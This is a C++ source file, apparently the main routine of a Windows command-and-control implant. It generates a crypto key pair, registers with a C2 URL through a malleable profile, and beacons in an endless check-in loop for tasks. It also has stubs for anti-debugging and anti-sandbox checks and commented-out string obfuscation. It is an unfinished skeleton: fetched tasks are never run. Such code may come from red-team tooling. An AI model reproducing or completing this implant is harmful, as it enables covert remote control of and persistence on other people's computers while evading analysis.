#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
#include <sodium.h>
#include <string.h>
#include <vector>
// #include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "crypto.h"
#include "httpclient.h"
#include "profile.h"
#include "implant.h"
#include "constants.h"
#include "debug.h"

using namespace std;
// using namespace andrivet::ADVobfuscator;

MalleableProfile *currentProfile;

std::string LPBYTEToString(LPBYTE bytes, size_t length)
{
	return std::string(reinterpret_cast<char *>(bytes), reinterpret_cast<char *>(bytes + length));
}

size_t GetLPBYTELength(LPBYTE bytes)
{
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery(bytes, &mbi, sizeof(mbi));
	return mbi.RegionSize;
}

int main()
{
	if (sodium_init() < 0)
	{
		return 1;
	}

	// Anti Debug

	// Anti Sandbox

	string privKey;
	string pubKey;
	int status = createBase64KeyPair(&privKey, &pubKey);

	if (status != 0)
	{
		DEBUG_PRINTF("Error creating key pair, aborting\n");
		exit(1);
	}

	currentProfile = Register(C2_URL, pubKey, privKey);

	if (currentProfile == NULL)
	{
		DEBUG_PRINTF("Error registering, aborting\n");
		exit(1);
	}

	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());

	// // do stuff with the response
	Sleep(1);

	PSIZE_T outSize = 0;

	// // Checkin loop
	while (TRUE)
	{
		//Sleep(currentProfile->sleep * 1000);
		Sleep(1000);
		Task* newTask = Checkin(C2_URL, currentProfile);
	}

	rapidjson::Document document;
	const char *answer_str = "{\"hello\": \"world\"}";
	document.Parse(answer_str);
	DEBUG_PRINTF("hello = %s\n", document["hello"].GetString());
	return 0;
}
